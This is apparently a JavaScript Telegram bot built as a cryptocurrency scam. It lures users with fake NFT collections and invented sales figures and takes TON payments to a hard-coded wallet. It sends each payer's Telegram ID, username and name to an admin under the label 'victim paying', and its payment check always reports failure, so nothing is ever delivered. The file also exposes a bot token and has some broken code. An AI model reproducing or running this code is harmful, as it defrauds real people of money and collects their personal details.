 // index.js — кидай этот файл в корень репозитория
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');

const BOT_TOKEN = '8585183097:AAEAoVSXIGaAfJe52qti3GmrpbtHcYFBY3Y';
const WALLET_TON = 'UQAdqmGgJmCs5vll9d4jNGK5aBFd9LaS3l-gRNuua8jMdbAS';
const ADMIN_ID = 8586263322;

const bot = new Telegraf(BOT_TOKEN);

// 18 самых горячих коллекций декабря 2025 — рандомно выбирается для каждой жертвы
const collections = [
    {name: 'CyberFox Genesis',        • 3333 supply', price1: 3.7, price5: 17,   emoji: '🦊', sold: 2987},
    {name: 'Gnome Land                 • 5555 supply', price1: 4.2, price5: 19,   emoji: '🧙', sold: 4872},
    {name: 'Rich Cats                   • 8888 supply', price1: 5.5, price5: 25,   emoji: '🐱', sold: 8211},
    {name: 'TON Punks                   • 10k supply',  price1: 6.9, price5: 32,   emoji: '👨‍🎤', sold: 9643},
    {name: 'Blum Dogs                    • 4444 supply', price1: 2.9, price5: 13,   emoji: '🐶', sold: 4012},
    {name: 'Hamster Kombat NFT          • 7777 supply', price1: 4.8, price5: 22,   emoji: '🐹', sold: 7123},
    {name: 'NotPixel Heroes             • 9999 supply', price1: 3.3, price5: 15,   emoji: '🦸', sold: 9331},
    {name: 'Lost Dogs                    • 6666 supply', price1: 7.7, price5: 35,   emoji: '🥺', sold: 5988},
    {name: 'Rocky Rabbit                 • 5000 supply', price1: 3.9, price5: 18,   emoji: '🐰', sold: 4666},
    {name: 'Catizen Cats                  • 3333 supply', price1: 8.8, price5: 40,   emoji: '😼', sold: 3111},
    {name: 'TapSwap Ducks               • 4444 supply', price1: 2.5, price5: 11,   emoji: '🦆', sold: 3999},
    {name: 'Major Stars                  • 8888 supply', price1: 6.6, price5: 30,   emoji: '⭐', sold: 8444},
    {name: 'X Empire                     • 10k supply',  price1: 5.9, price5: 27,   emoji: '⚔️', sold: 9777},
    {name: 'Seed App                     • 5555 supply', price1: 4.4, price5: 20,   emoji: '🌱', sold: 5111},
    {name: 'Vertus Flowers              • 6666 supply', price1: 3.1, price5: 14,   emoji: '🌸', sold: 6222},
    {name: 'TON Frogs                    • 7777 supply', price1: 9.9, price5: 45,   emoji: '🐸', sold: 7555},
    {name: 'Pixel Foxes                 • 2222 supply', price1: 12.0,price5: 55,   emoji: '🦊', sold: 2198},
    {name: 'Anomaly Punks               • 3333 supply', price1: 15.0,price5: 70,   emoji: '👽', sold: 3289}
];

bot.start((ctx) => {
    const col = collections[Math.floor(Math.random() * collections.length)];
    ctx.session = { col }; // запоминаем коллекцию для юзера

    const soldPercent = Math.round(col.sold / (col.name.includes('10k') ? 10000 : col.name.includes('8888') ? 8888 : col.name.includes('7777') ? 7777 : col.name.includes('6666') ? 6666 : col.name.includes('5555') ? 5555 : 3333) * 100);

    ctx.replyWithHTML(
        `<b>${col.emoji} MINT IS LIVE — ${col.name.split('•')[0]}</b>\n\n` +
        `<b>${col.emoji} Supply:</b> ${col.name.split('•')[1]}\n` +
        `<b>${col.emoji} Уже заминчено:</b> ${col.sold} (${soldPercent}%)\n\n` +
        `Цена публичного минта:\n` +
        `• 1 NFT — <b>${col.price1} TON</b>\n` +
        `• 5 NFT — <b>${col.price5} TON</b> (скидка до 15%)\n\n` +
        `<i>Мгновенный минт через TON Keeper / Tonhub</i>\n` +
        `<i>NFT приходят сразу после оплаты</i>`,
        menu(col)
    );
});

function menu(col) {
    return Markup.inlineKeyboard([
        [Markup.button.callback(`${col.emoji} Mint 1 × ${col.price1} TON`, 'mint1')],
        [Markup.button.callback(`${col.emoji} Mint 5 × ${col.price5} TON`, 'mint5')],
        [Markup.button.callback('My NFTs', 'mynft')]
    ]);
}

bot.action(/mint(\d+)/, async (ctx) => {
    const col = ctx.session.col;
    const count = ctx.match[1] == '5' ? 5 : 1;
    const amount = count == 5 ? col.price5 : col.price1;
    const comment = col.emoji + 'NFT' + Math.random().toString(36).substring(2,10).toUpperCase();

    const tonLink = `ton://transfer/${WALLET_TON}?amount=${amount*1000000000}&text=${comment}`;

    ctx.editMessageText(
        `${col.emoji} <b>Заказ: ${count} × col.name.split('•')[0]} NFT</b>\n\n` +
        `Сумма: <b>${amount} TON</b>\n` +
        `Комментарий: <code>${comment}</code>\n\n` +
        `Кошелёк:\n<code>${WALLET_TON}</code>\n\n` +
        `<i>Оплати точно с комментарием — NFT придут автоматически за 30–90 секунд</i>`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Оплатить TON', url: tonLink }],
                    [{ text: 'USDT/TRC20 • Карта • BTC', url: 'https://t.me/CryptoBot?start=pay' }],
                    [{ text: 'Проверить оплату', callback_data: `check_${Date.now()}` }]
                ]
            }
        }
    );

    bot.telegram.sendMessage(ADMIN_ID,
        `ЖЕРТВА ОПЛАЧИВАЕТ\n` +
        `Коллекция: ${col.name.split('•')[0]}\n` +
        `ID: ${ctx.from.id}\n` +
        `Ник: @${ctx.from.username || 'нет'}\n` +
        `Имя: ${ctx.from.first_name}\n` +
        `Заказ: ${count} NFT\n` +
        `Сумма: ${amount} TON\n` +
        `Комментарий: ${comment}\n` +
        `Время: ${new Date().toLocaleString('ru')}`
    );
});

bot.action(/check_/, async (ctx) => {
    await ctx.answerCbQuery('Сканируем блокчейн TON... 🔄', { show_alert: true });
    setTimeout(() => {
        ctx.editMessageText(`Платёж не обнаружен\n\nПроверьте:\n• точная сумма\n• правильный комментарий\n• отправлено с TON-кошелька\n\nПопробуйте ещё раз через минуту`, {
            reply_markup: { inline_keyboard: [[{ text: 'Проверить снова', callback_data: ctx.callbackQuery.data }]] }
        });
    }, 3000);
});

bot.action('mynft', (ctx) => {
    const col = ctx.session?.col || collections[0];
    ctx.editMessageText(`${col.emoji} Поиск твоих NFT...\n\nНичего не найдено 😔\nТы ещё не заминтил в этой коллекции`, {
        reply_markup: menu(col).reply_markup
    });
});

bot.launch();
console.log('Ультра-скам бот 2025 запущен — весь TON на UQAdqmG...dbAS');